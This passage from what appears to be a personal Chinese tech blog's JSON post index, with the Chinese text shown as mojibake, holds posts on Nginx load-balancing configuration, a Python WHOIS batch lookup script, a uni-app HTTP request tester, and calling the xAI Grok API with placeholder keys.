‡å¯ä»¥ä½¿ç”¨upstreamæ¨¡å—æ¥å®šä¹‰ä¸€ä¸ªè´Ÿè½½å‡è¡¡æ± ã€‚Nginxå¯ä»¥æ ¹æ®é…ç½®çš„ç­–ç•¥ï¼ˆä¾‹å¦‚è½®è¯¢ã€æœ€å°‘è¿æ¥ç­‰ï¼‰å°†è¯·æ±‚åˆ†å‘åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ã€‚ ä»¥ä¸‹æ˜¯å…·ä½“æ­¥éª¤ï¼š 1. ç¼–è¾‘Nginxé…ç½®æ–‡ä»¶æ‰“å¼€Nginxçš„é…ç½®æ–‡ä»¶ï¼š 12sudo nano /etc/nginx/sites-available/default 2. æ·»åŠ upstreamå—åœ¨é…ç½®æ–‡ä»¶çš„é¡¶éƒ¨æˆ–é€‚å½“ä½ç½®æ·»åŠ ä¸€ä¸ªupstreamå—ï¼Œå®šä¹‰åç«¯æœåŠ¡å™¨æ± ï¼š 12345Nginxupstream backend_servers &#123; server 192.168.1.100:8080; server 192.168.1.101:8081;&#125; 3. ä¿®æ”¹serverå—åœ¨serverå—ä¸­ï¼Œå°†proxy_passæŒ‡ä»¤æŒ‡å‘åˆšåˆšå®šä¹‰çš„upstreamå—ï¼š 1234567891011121314Nginxserver &#123; listen 80; server_name your_domain_or_ip; location / &#123; proxy_pass http://backend_servers; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; &#125;&#125; 4. æµ‹è¯•é…ç½®æ–‡ä»¶ä¿å­˜å¹¶é€€å‡ºç¼–è¾‘å™¨åï¼Œæµ‹è¯•Nginxé…ç½®æ˜¯å¦æ­£ç¡®æ— è¯¯ï¼š 1sudo nginx -t 5. é‡æ–°åŠ è½½Nginxå¦‚æœæµ‹è¯•æˆåŠŸï¼Œé‡æ–°åŠ è½½Nginxä»¥ä½¿æ›´æ”¹ç”Ÿæ•ˆï¼š 1sudo systemctl reload nginx 6. éªŒè¯é…ç½®é€šè¿‡æµè§ˆå™¨è®¿é—®åŸŸåæˆ–æœåŠ¡å™¨çš„å…¬ç½‘IPåœ°å€ï¼Œæ£€æŸ¥è¯·æ±‚æ˜¯å¦æ­£ç¡®åœ°è¢«åˆ†å‘åˆ°ä¸¤ä¸ªåç«¯æœåŠ¡å™¨ã€‚ 7. è¿›ä¸€æ­¥é…ç½®ï¼ˆå¯é€‰ï¼‰å¦‚æœéœ€è¦æ›´å¤æ‚çš„è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œå¯ä»¥åœ¨upstreamå—ä¸­æ·»åŠ æ›´å¤šé€‰é¡¹ã€‚ä¾‹å¦‚ï¼š è½®è¯¢ï¼ˆé»˜è®¤ï¼‰ï¼šæ¯ä¸ªè¯·æ±‚æŒ‰æ—¶é—´é¡ºåºé€ä¸€åˆ†é…åˆ°ä¸åŒçš„æœåŠ¡å™¨ï¼Œå¦‚æœåç«¯æŸä¸ªæœåŠ¡å™¨å®•æœºï¼Œèƒ½è‡ªåŠ¨å‰”é™¤ã€‚æœ€å°‘è¿æ¥ï¼šè¯·æ±‚åˆ†é…ç»™è¿æ¥æ•°æœ€å°‘çš„æœåŠ¡å™¨ã€‚IPå“ˆå¸Œï¼šæ¯ä¸ªè¯·æ±‚æŒ‰è®¿é—®å®¢æˆ·ç«¯çš„IPå“ˆå¸Œç»“æœåˆ†é…ï¼Œè¿™æ ·æ¥è‡ªåŒä¸€å®¢æˆ·ç«¯çš„è¯·æ±‚ä¼šåˆ†é…åˆ°åŒä¸€å°åç«¯æœåŠ¡å™¨ã€‚ç¤ºä¾‹é…ç½®ï¼š 1234567891011121314Nginxupstream backend_servers &#123; # è½®è¯¢ï¼ˆé»˜è®¤ï¼‰ server 192.168.1.100:8080; server 192.168.1.101:8081; # æœ€å°‘è¿æ¥ # least_conn; # IPå“ˆå¸Œ # ip_hash;&#125; è´Ÿè½½å‡è¡¡ç­–ç•¥åŠå…¶é…ç½®æ–¹æ³•ï¼š1. è½®è¯¢ï¼ˆé»˜è®¤ï¼‰è½®è¯¢æ˜¯Nginxé»˜è®¤çš„è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œæ¯ä¸ªè¯·æ±‚æŒ‰æ—¶é—´é¡ºåºé€ä¸€åˆ†é…åˆ°ä¸åŒçš„æœåŠ¡å™¨ã€‚å¦‚æœåç«¯æŸä¸ªæœåŠ¡å™¨å®•æœºï¼ŒNginxä¼šè‡ªåŠ¨å°†å…¶ä»è½®è¯¢åˆ—è¡¨ä¸­å‰”é™¤ã€‚ 1234upstream backend_servers &#123; server 192.168.1.100:8080; server 192.168.1.101:8081;&#125; 2. æœ€å°‘è¿æ¥æœ€å°‘è¿æ¥ç­–ç•¥å°†è¯·æ±‚åˆ†é…ç»™å½“å‰è¿æ¥æ•°æœ€å°‘çš„æœåŠ¡å™¨ï¼Œé€‚ç”¨äºå¤„ç†é•¿è¿æ¥çš„åœºæ™¯ã€‚ 12345upstream backend_servers &#123; least_conn; server 192.168.1.100:8080; server 192.168.1.101:8081;&#125; 3. IPå“ˆå¸ŒIPå“ˆå¸Œç­–ç•¥æ ¹æ®å®¢æˆ·ç«¯çš„IPåœ°å€è¿›è¡Œå“ˆå¸Œè¿ç®—ï¼Œç¡®ä¿æ¥è‡ªåŒä¸€å®¢æˆ·ç«¯çš„è¯·æ±‚æ€»æ˜¯è¢«åˆ†é…åˆ°åŒä¸€å°åç«¯æœåŠ¡å™¨ã€‚è¿™åœ¨ä¼šè¯ä¿æŒï¼ˆSession Stickinessï¼‰åœºæ™¯ä¸­éå¸¸æœ‰ç”¨ã€‚ 12345upstream backend_servers &#123; ip_hash; server 192.168.1.100:8080; server 192.168.1.101:8081;&#125; 4. åŠ æƒè½®è¯¢åŠ æƒè½®è¯¢å…è®¸ä¸ºæ¯ä¸ªåç«¯æœåŠ¡å™¨åˆ†é…æƒé‡ï¼Œæƒé‡è¶Šé«˜ï¼Œè¢«åˆ†é…åˆ°è¯·æ±‚çš„æ¦‚ç‡è¶Šå¤§ã€‚ 1234upstream backend_servers &#123; server 192.168.1.100:8080 weight=3; server 192.168.1.101:8081 weight=1;&#125; 5. å¤‡ç”¨æœåŠ¡å™¨å¯ä»¥æŒ‡å®šå¤‡ç”¨æœåŠ¡å™¨ï¼Œå½“ä¸»æœåŠ¡å™¨ä¸å¯ç”¨æ—¶ï¼Œè¯·æ±‚ä¼šè¢«è½¬å‘åˆ°å¤‡ç”¨æœåŠ¡å™¨ã€‚ 1234upstream backend_servers &#123; server 192.168.1.100:8080; server 192.168.1.101:8081 backup;&#125; 6. ç»„åˆç­–ç•¥ä¹Ÿå¯ä»¥ç»„åˆä½¿ç”¨å¤šç§ç­–ç•¥ï¼Œä¾‹å¦‚åŒæ—¶ä½¿ç”¨IPå“ˆå¸Œå’ŒåŠ æƒè½®è¯¢ã€‚ 12345upstream backend_servers &#123; ip_hash; server 192.168.1.100:8080 weight=3; server 192.168.1.101:8081 weight=1;&#125; 7. æµ‹è¯•å’Œåº”ç”¨é…ç½®å®Œæˆé…ç½®åï¼Œæµ‹è¯•Nginxé…ç½®æ–‡ä»¶æ˜¯å¦æ­£ç¡®æ— è¯¯ï¼š 1sudo nginx -t å¦‚æœæµ‹è¯•æˆåŠŸï¼Œé‡æ–°åŠ è½½Nginxä»¥ä½¿æ›´æ”¹ç”Ÿæ•ˆï¼š 1sudo systemctl reload nginx 8. éªŒè¯é…ç½®é€šè¿‡æµè§ˆå™¨æˆ–å…¶ä»–å·¥å…·è®¿é—®åŸŸåæˆ–æœåŠ¡å™¨çš„å…¬ç½‘IPåœ°å€ï¼Œæ£€æŸ¥è¯·æ±‚æ˜¯å¦æŒ‰é¢„æœŸè¢«åˆ†å‘åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ã€‚ä½¿ç”¨æ—¥å¿—æˆ–åç«¯æœåŠ¡å™¨ä¸Šçš„è®¿é—®è®°å½•æ¥éªŒè¯è´Ÿè½½å‡è¡¡çš„æ•ˆæœã€‚ é€šè¿‡è¿™äº›é…ç½®ï¼Œå¯ä»¥å®ç°æ›´çµæ´»å’Œå¼ºå¤§çš„è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œä»¥æ»¡è¶³ä¸åŒä¸šåŠ¡åœºæ™¯çš„éœ€æ±‚ã€‚ å®Œæ•´çš„Nginxé…ç½®ç¤ºä¾‹å®Œæ•´çš„Nginxé…ç½®ç¤ºä¾‹ï¼Œå…¶ä¸­åŒ…å«ä¸¤å°ä¸»ç”¨æœåŠ¡å™¨å’Œä¸€å°å¤‡ç”¨æœåŠ¡å™¨ã€‚è¿™ä¸ªé…ç½®å°†ä½¿ç”¨è½®è¯¢ç­–ç•¥ï¼Œå¹¶ä¸”å¤‡ç”¨æœåŠ¡å™¨å°†åœ¨ä¸»ç”¨æœåŠ¡å™¨ä¸å¯ç”¨æ—¶æ¥ç®¡è¯·æ±‚ã€‚ 12345678910111213141516171819202122232425262728293031323334353637# /etc/nginx/sites-available/default# å®šä¹‰ä¸Šæ¸¸æœåŠ¡å™¨ç»„upstream backend_servers &#123; # ä¸»ç”¨æœåŠ¡å™¨ server 192.168.1.100:8080; server 192.168.1.101:8081; # å¤‡ç”¨æœåŠ¡å™¨ server 192.168.1.102:8082 backup;&#125;# å®šä¹‰æœåŠ¡å™¨å—server &#123; listen 80; server_name your_domain_or_ip; # å®šä¹‰locationå— location / &#123; proxy_pass http://backend_servers; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; &#125; # å¯é€‰ï¼šå®šä¹‰é”™è¯¯é¡µé¢ error_page 404 /404.html; location = /404.html &#123; internal; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; internal; &#125;&#125; upstream å—:server 192.168.1.100:8080; å’Œ server 192.168.1.101:8081; æ˜¯ä¸¤å°ä¸»ç”¨æœåŠ¡å™¨ã€‚server 192.168.1.102:8082 backup; æ˜¯ä¸€å°å¤‡ç”¨æœåŠ¡å™¨ï¼Œåªæœ‰åœ¨ä¸»ç”¨æœåŠ¡å™¨ä¸å¯ç”¨æ—¶æ‰ä¼šè¢«ä½¿ç”¨ã€‚server å—:listen 80; æŒ‡å®šäº†Nginxç›‘å¬çš„ç«¯å£å·ï¼Œè¿™é‡Œæ˜¯80ç«¯å£ã€‚server_name your_domain_or_ip; åº”è¯¥æ›¿æ¢ä¸ºåŸŸåæˆ–æœåŠ¡å™¨çš„å…¬ç½‘IPåœ°å€ã€‚location å—:proxy_pass http://backend_servers; å°†è¯·æ±‚ä»£ç†åˆ°å®šä¹‰çš„ä¸Šæ¸¸æœåŠ¡å™¨ç»„ã€‚proxy_set_header æŒ‡ä»¤ç”¨äºè®¾ç½®è½¬å‘ç»™åç«¯æœåŠ¡å™¨çš„è¯·æ±‚å¤´ä¿¡æ¯ã€‚é”™è¯¯é¡µé¢:error_page 404 &#x2F;404.html; å’Œ location &#x3D; &#x2F;404.html { internal; } ç”¨äºå®šä¹‰404é”™è¯¯é¡µé¢ã€‚error_page 500 502 503 504 &#x2F;50x.html; å’Œ location &#x3D; &#x2F;50x.html { internal; } ç”¨äºå®šä¹‰500ç³»åˆ—é”™è¯¯é¡µé¢ã€‚ æ—¥å¿—:æŸ¥çœ‹Nginxçš„è®¿é—®æ—¥å¿—å’Œé”™è¯¯æ—¥å¿—ï¼Œç¡®ä¿ä¸€åˆ‡æ­£å¸¸ï¼š 1234Bashsudo tail -f /var/log/nginx/access.logsudo tail -f /var/log/nginx/error.log ä»¥å®ç°ä¸¤å°ä¸»ç”¨æœåŠ¡å™¨å’Œä¸€å°å¤‡ç”¨æœåŠ¡å™¨çš„è´Ÿè½½å‡è¡¡ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"nigix","slug":"nigix","permalink":"https://banjinmei.github.io/tags/nigix/"},{"name":"keepalived","slug":"keepalived","permalink":"https://banjinmei.github.io/tags/keepalived/"},{"name":"inotify","slug":"inotify","permalink":"https://banjinmei.github.io/tags/inotify/"},{"name":"rsync","slug":"rsync","permalink":"https://banjinmei.github.io/tags/rsync/"}],"author":"mu"},{"title":"python whoisdomain","slug":"python-whoisdomain","date":"2024-11-21T15:31:52.000Z","updated":"2024-11-21T15:32:33.020Z","comments":true,"path":"2024/11/21/python-whoisdomain/","permalink":"https://banjinmei.github.io/2024/11/21/python-whoisdomain/","excerpt":"","text":"1pip install python-whois 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import whois# è¯»å–æ–‡ä»¶ä¸­çš„åŸŸådef read_domains_from_file(file_path): with open(file_path, &#x27;r&#x27;) as file: domains = [line.strip() for line in file if line.strip()] return domains# æŸ¥è¯¢åŸŸåçš„WHOISä¿¡æ¯def query_whois(domain): try: domain_info = whois.whois(domain) if domain_info.domain_name: return domain_info else: return None except Exception as e: print(f&quot;Error querying WHOIS for &#123;domain&#125;: &#123;e&#125;&quot;) return None# ä¿å­˜æŸ¥è¯¢ç»“æœåˆ°æ–‡ä»¶def save_results_to_file(domains, results, output_file): with open(output_file, &#x27;w&#x27;) as file: for domain, result in results.items(): if result: file.write(f&quot;Domain: &#123;domain&#125;\\n&quot;) file.write(&quot;WHOIS Information:\\n&quot;) for key, value in result.items(): if isinstance(value, list): for item in value: file.write(f&quot;&#123;key&#125;: &#123;item&#125;\\n&quot;) else: file.write(f&quot;&#123;key&#125;: &#123;value&#125;\\n&quot;) file.write(&quot;\\n&quot;) else: file.write(f&quot;Domain: &#123;domain&#125; - Not Registered\\n\\n&quot;)# ä¸»å‡½æ•°def main(): file_path = &#x27;12.txt&#x27; # æ–‡ä»¶è·¯å¾„ output_file = &#x27;whois_results2.txt&#x27; # è¾“å‡ºæ–‡ä»¶è·¯å¾„ domains = read_domains_from_file(file_path) results = &#123;&#125; for domain in domains: domain_info = query_whois(domain) results[domain] = domain_info save_results_to_file(domains, results, output_file) print(f&quot;WHOIS results have been saved to &#123;output_file&#125;&quot;)if __name__ == &quot;__main__&quot;: main()","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"python","slug":"python","permalink":"https://banjinmei.github.io/tags/python/"}],"author":"mu"},{"title":"uniapp postman","slug":"uniapp-postman","date":"2024-11-21T13:43:36.000Z","updated":"2024-11-21T14:21:55.730Z","comments":true,"path":"2024/11/21/uniapp-postman/","permalink":"https://banjinmei.github.io/2024/11/21/uniapp-postman/","excerpt":"","text":"åŸºç¡€é¡µé¢123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;template&gt; &lt;view class=&quot;content&quot;&gt; &lt;input v-model=&quot;url&quot; placeholder=&quot;è¯·è¾“å…¥è¯·æ±‚åœ°å€&quot; /&gt; &lt;picker :range=&quot;methods&quot; @change=&quot;onMethodChange&quot;&gt; &lt;view&gt;&#123;&#123; methods[selectedIndex] &#125;&#125;&lt;/view&gt; &lt;/picker&gt; &lt;textarea v-model=&quot;body&quot; placeholder=&quot;è¯·è¾“å…¥è¯·æ±‚ä½“&quot;&gt;&lt;/textarea&gt; &lt;button @click=&quot;sendRequest&quot;&gt;å‘é€è¯·æ±‚&lt;/button&gt; &lt;view v-if=&quot;response&quot; class=&quot;response&quot;&gt; &lt;text&gt;å“åº”:&lt;/text&gt; &lt;pre&gt;&#123;&#123; response &#125;&#125;&lt;/pre&gt; &lt;/view&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; url: &#x27;&#x27;, body: &#x27;&#x27;, response: &#x27;&#x27;, methods: [&#x27;GET&#x27;, &#x27;POST&#x27;], selectedIndex: 0 &#125;; &#125;, methods: &#123; onMethodChange(e) &#123; this.selectedIndex = e.detail.value; &#125;, sendRequest() &#123; const method = this.methods[this.selectedIndex]; const data = method === &#x27;POST&#x27; ? JSON.parse(this.body) : null; uni.request(&#123; url: this.url, method: method, data: data, success: (res) =&gt; &#123; this.response = JSON.stringify(res.data, null, 2); &#125;, fail: (err) =&gt; &#123; this.response = JSON.stringify(err, null, 2); &#125; &#125;); &#125; &#125;&#125;;&lt;/script&gt;&lt;style&gt;.content &#123; padding: 20px;&#125;input, textarea, button &#123; width: 100%; margin-bottom: 10px;&#125;.response &#123; background-color: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto;&#125;&lt;/style&gt; æ·»åŠ  methods delete putï¼Œæ·»åŠ header ï¼Œç»™å‡ºä¿®æ”¹åçš„ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;template&gt; &lt;view class=&quot;content&quot;&gt; &lt;input v-model=&quot;url&quot; placeholder=&quot;è¯·è¾“å…¥è¯·æ±‚åœ°å€&quot; /&gt; &lt;picker :range=&quot;methods&quot; @change=&quot;onMethodChange&quot;&gt; &lt;view&gt;&#123;&#123; methods[selectedIndex] &#125;&#125;&lt;/view&gt; &lt;/picker&gt; &lt;textarea v-model=&quot;body&quot; placeholder=&quot;è¯·è¾“å…¥è¯·æ±‚ä½“&quot;&gt;&lt;/textarea&gt; &lt;input v-model=&quot;headers.Authorization&quot; placeholder=&quot;è¯·è¾“å…¥Authorizationå¤´&quot; /&gt; &lt;input v-model=&quot;headers[&#x27;Content-Type&#x27;]&quot; placeholder=&quot;è¯·è¾“å…¥Content-Typeå¤´&quot; /&gt; &lt;button @click=&quot;sendRequest&quot;&gt;å‘é€è¯·æ±‚&lt;/button&gt; &lt;view v-if=&quot;response&quot; class=&quot;response&quot;&gt; &lt;text&gt;å“åº”:&lt;/text&gt; &lt;pre&gt;&#123;&#123; response &#125;&#125;&lt;/pre&gt; &lt;/view&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; url: &#x27;&#x27;, body: &#x27;&#x27;, response: &#x27;&#x27;, methods: [&#x27;GET&#x27;, &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;], selectedIndex: 0, headers: &#123; Authorization: &#x27;&#x27;, &#x27;Content-Type&#x27;: &#x27;application/json&#x27; &#125; &#125;; &#125;, methods: &#123; onMethodChange(e) &#123; this.selectedIndex = e.detail.value; &#125;, sendRequest() &#123; const method = this.methods[this.selectedIndex]; const data = method !== &#x27;GET&#x27; ? JSON.parse(this.body) : null; uni.request(&#123; url: this.url, method: method, data: data, header: this.headers, success: (res) =&gt; &#123; this.response = JSON.stringify(res.data, null, 2); &#125;, fail: (err) =&gt; &#123; this.response = JSON.stringify(err, null, 2); &#125; &#125;); &#125; &#125;&#125;;&lt;/script&gt;&lt;style&gt;.content &#123; padding: 20px;&#125;input, textarea, button &#123; width: 100%; margin-bottom: 10px;&#125;.response &#123; background-color: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto;&#125;&lt;/style&gt; urlï¼šç”¨æˆ·è¾“å…¥çš„è¯·æ±‚åœ°å€ã€‚bodyï¼šç”¨æˆ·è¾“å…¥çš„è¯·æ±‚ä½“ã€‚responseï¼šæœåŠ¡å™¨è¿”å›çš„å“åº”å†…å®¹ã€‚methodsï¼šæ”¯æŒçš„HTTPæ–¹æ³•æ•°ç»„ã€‚selectedIndexï¼šå½“å‰é€‰ä¸­çš„HTTPæ–¹æ³•ç´¢å¼•ã€‚headersï¼šè¯·æ±‚å¤´å¯¹è±¡ï¼ŒåŒ…å«Authorizationå’ŒContent-Typeã€‚onMethodChange(e)ï¼šå½“ç”¨æˆ·é€‰æ‹©ä¸åŒçš„HTTPæ–¹æ³•æ—¶ï¼Œæ›´æ–°selectedIndexã€‚sendRequest()ï¼šå‘é€HTTPè¯·æ±‚ã€‚æ ¹æ®é€‰ä¸­çš„HTTPæ–¹æ³•å’Œè¯·æ±‚ä½“ï¼Œè°ƒç”¨uni.requestå‘é€è¯·æ±‚ï¼Œå¹¶å¤„ç†æˆåŠŸå’Œå¤±è´¥çš„å›è°ƒã€‚ æ·»åŠ äº†ä¸¤ä¸ªè¾“å…¥æ¡†ï¼Œåˆ†åˆ«ç”¨äºè®¾ç½®Authorizationå’ŒContent-Typeè¯·æ±‚å¤´ã€‚åœ¨uni.requestä¸­ï¼Œé€šè¿‡headerå±æ€§ä¼ é€’è¯·æ±‚å¤´ã€‚ åŠ¨æ€è¯·æ±‚å¤´123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105&lt;template&gt; &lt;view class=&quot;content&quot;&gt; &lt;input v-model=&quot;url&quot; placeholder=&quot;è¯·è¾“å…¥è¯·æ±‚åœ°å€&quot; /&gt; &lt;picker :range=&quot;methods&quot; @change=&quot;onMethodChange&quot;&gt; &lt;view&gt;&#123;&#123; methods[selectedIndex] &#125;&#125;&lt;/view&gt; &lt;/picker&gt; &lt;textarea v-model=&quot;body&quot; placeholder=&quot;è¯·è¾“å…¥è¯·æ±‚ä½“&quot;&gt;&lt;/textarea&gt; &lt;!-- åŠ¨æ€è¯·æ±‚å¤´è¾“å…¥æ¡† --&gt; &lt;view v-for=&quot;(header, index) in headers&quot; :key=&quot;index&quot; class=&quot;header-input&quot;&gt; &lt;input v-model=&quot;header.key&quot; placeholder=&quot;é”®&quot; /&gt; &lt;input v-model=&quot;header.value&quot; placeholder=&quot;å€¼&quot; /&gt; &lt;button @click=&quot;removeHeader(index)&quot;&gt;åˆ é™¤&lt;/button&gt; &lt;/view&gt; &lt;button @click=&quot;addHeader&quot;&gt;æ·»åŠ è¯·æ±‚å¤´&lt;/button&gt; &lt;button @click=&quot;sendRequest&quot;&gt;å‘é€è¯·æ±‚&lt;/button&gt; &lt;view v-if=&quot;response&quot; class=&quot;response&quot;&gt; &lt;text&gt;å“åº”:&lt;/text&gt; &lt;pre&gt;&#123;&#123; response &#125;&#125;&lt;/pre&gt; &lt;/view&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; url: &#x27;&#x27;, body: &#x27;&#x27;, response: &#x27;&#x27;, methods: [&#x27;GET&#x27;, &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;], selectedIndex: 0, headers: [ &#123; key: &#x27;Authorization&#x27;, value: &#x27;&#x27; &#125;, &#123; key: &#x27;Content-Type&#x27;, value: &#x27;application/json&#x27; &#125; ] &#125;; &#125;, methods: &#123; onMethodChange(e) &#123; this.selectedIndex = e.detail.value; &#125;, addHeader() &#123; this.headers.push(&#123; key: &#x27;&#x27;, value: &#x27;&#x27; &#125;); &#125;, removeHeader(index) &#123; this.headers.splice(index, 1); &#125;, sendRequest() &#123; const method = this.methods[this.selectedIndex]; const data = method !== &#x27;GET&#x27; ? JSON.parse(this.body) : null; // å°†headerså¯¹è±¡è½¬æ¢ä¸ºuni.requestæ‰€éœ€çš„æ ¼å¼ const requestHeaders = this.headers.reduce((acc, header) =&gt; &#123; if (header.key &amp;&amp; header.value) &#123; acc[header.key] = header.value; &#125; return acc; &#125;, &#123;&#125;); uni.request(&#123; url: this.url, method: method, data: data, header: requestHeaders, success: (res) =&gt; &#123; this.response = JSON.stringify(res.data, null, 2); &#125;, fail: (err) =&gt; &#123; this.response = JSON.stringify(err, null, 2); &#125; &#125;); &#125; &#125;&#125;;&lt;/script&gt;&lt;style&gt;.content &#123; padding: 20px;&#125;input, textarea, button &#123; width: 100%; margin-bottom: 10px;&#125;.header-input &#123; display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;&#125;.header-input input &#123; width: 45%;&#125;.header-input button &#123; width: 10%;&#125;.response &#123; background-color: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto;&#125; ä½¿ç”¨v-foræŒ‡ä»¤éå†headersæ•°ç»„ï¼Œä¸ºæ¯ä¸ªè¯·æ±‚å¤´ç”Ÿæˆä¸€å¯¹è¾“å…¥æ¡†å’Œä¸€ä¸ªåˆ é™¤æŒ‰é’®ã€‚æä¾›ä¸€ä¸ªâ€œæ·»åŠ è¯·æ±‚å¤´â€æŒ‰é’®ï¼Œå…è®¸ç”¨æˆ·åŠ¨æ€æ·»åŠ æ–°çš„è¯·æ±‚å¤´è¾“å…¥æ¡†ã€‚ é•¿æŒ‰å¤åˆ¶ç»“æœ12345&lt;view v-if=&quot;response&quot; class=&quot;response&quot; @longpress=&quot;copyResponse&quot;&gt; &lt;text&gt;å“åº”:&lt;/text&gt; &lt;pre&gt;&#123;&#123; response &#125;&#125;&lt;/pre&gt;&lt;/view&gt; 1234567891011121314151617181920212223242526272829 copyResponse() &#123; uni.setClipboardData(&#123; data: this.response, success: () =&gt; &#123; uni.showToast(&#123; title: &#x27;å¤åˆ¶æˆåŠŸ&#x27;, icon: &#x27;success&#x27; &#125;); &#125;, fail: () =&gt; &#123; uni.showToast(&#123; title: &#x27;å¤åˆ¶å¤±è´¥&#x27;, icon: &#x27;none&#x27; &#125;); &#125; &#125;); &#125;&lt;style&gt;.response &#123; background-color: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; /* ä½¿æ–‡æœ¬æ¢è¡Œæ˜¾ç¤º */&#125;&lt;/style&gt; ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"uniapp","slug":"uniapp","permalink":"https://banjinmei.github.io/tags/uniapp/"},{"name":"postman","slug":"postman","permalink":"https://banjinmei.github.io/tags/postman/"}],"author":"mu"},{"title":"XAI Grok","slug":"XAI","date":"2024-11-19T14:54:15.000Z","updated":"2024-11-19T15:02:20.333Z","comments":true,"path":"2024/11/19/XAI/","permalink":"https://banjinmei.github.io/2024/11/19/XAI/","excerpt":"","text":"X.AIReg Create API key123456789101112131415curl https://api.x.ai/v1/chat/completions -H &quot;Content-Type: application/json&quot; -H &quot;Authorization: Bearer xai-xxx&quot; -d &#x27;&#123; &quot;messages&quot;: [ &#123; &quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a test assistant.&quot; &#125;, &#123; &quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;what can u do?&quot; &#125; ], &quot;model&quot;: &quot;grok-beta&quot;, &quot;stream&quot;: false, &quot;temperature&quot;: 0&#125;&#x27; python12345678910111213141516171819202122232425262728293031323334353637383940414243444546import requests# API URL å’Œ API å¯†é’¥API_URL = &quot;https://api.x.ai/v1/chat/completions&quot;API_KEY = &quot;xai-bELnXX&quot; # æ›¿æ¢ä¸ºå®é™… API å¯†é’¥# è¯·æ±‚å¤´headers = &#123; &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;Authorization&quot;: f&quot;Bearer &#123;API_KEY&#125;&quot;&#125;# è¯·æ±‚æ•°æ®data = &#123; &quot;messages&quot;: [ &#123; &quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a test assistant.&quot; &#125;, &#123; &quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;what can u do?&quot; &#125; ], &quot;model&quot;: &quot;grok-beta&quot;, &quot;stream&quot;: False, &quot;temperature&quot;: 0&#125;try: response = requests.post(API_URL, headers=headers, json=data) response.raise_for_status() # ç¡®ä¿çŠ¶æ€ç ä¸º 200 result = response.json() # è§£æå“åº” # print(&quot;API å“åº”ï¼š&quot;, result) # æå–å†…å®¹ if &#x27;choices&#x27; in result and result[&#x27;choices&#x27;]: content = result[&#x27;choices&#x27;][0][&#x27;message&#x27;][&#x27;content&#x27;] print(&quot;XAIå›ç­”ï¼š\\n&quot;) print(content) else: print(&quot;XAIçš„å›ç­”ã€‚&quot;)except requests.exceptions.HTTPError as e: print(&quot;HTTP é”™è¯¯ï¼š&quot;, e) print(&quot;å“åº”å†…å®¹ï¼š&quot;, response.text) # è¾“å‡ºè¯¦ç»†çš„é”™è¯¯ä¿¡æ¯except requests.exceptions.RequestException as e: print(&quot;è¯·æ±‚å¤±è´¥ï¼š&quot;, e)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"XAI","slug":"XAI","permalink":"https://banjinmei.github.io/tags/XAI/"},{"name":"Grok","slug":"Grok","permalink":"https://banjinmei.github.io/tags/Grok/"}],"author":"mu"},{"title":"Pythonè‚¡ç¥¨çˆ¬è™«","slug":"Pythonè‚¡ç¥¨çˆ¬è™«","date":"2024-11-19T14:07:04.000Z","updated":"2024-11-19T14:52:46.309Z","comments":true,"path":"2024/11/19/Pythonè‚¡ç¥¨çˆ¬è™«/","permalink":"https://banjinmei.github.io/2024/11/19/Python%E8%82%A1%E7%A5%A8%E7%88%AC%E8%99%AB/","excerpt":"","text":"åŠŸèƒ½æ¦‚å†µï¼šæ ¹æ®è‚¡ç¥¨ä»£ç ï¼Œé‡‡é›†æŒ‡å®šæ—¥æœŸè¿ç»­Nä¸ªäº¤æ˜“æ—¥æ•°æ®ï¼Œè¾“å‡ºä¿å­˜ä¸ºxlsæ•°æ®è¡¨ã€‚ è¯¦ç»†è¯´æ˜:å˜é‡ä¸ºè‚¡ç¥¨ä»£ç ã€æŒ‡å®šæ—¥æœŸã€Nä¸ªäº¤æ˜“æ—¥ï¼Œå˜é‡ä»¥xlsè¡¨æ ¼å½¢å¼ç»™å‡ºï¼Œçˆ¬è™«æ ¹æ®è‚¡ç¥¨ä»£ç 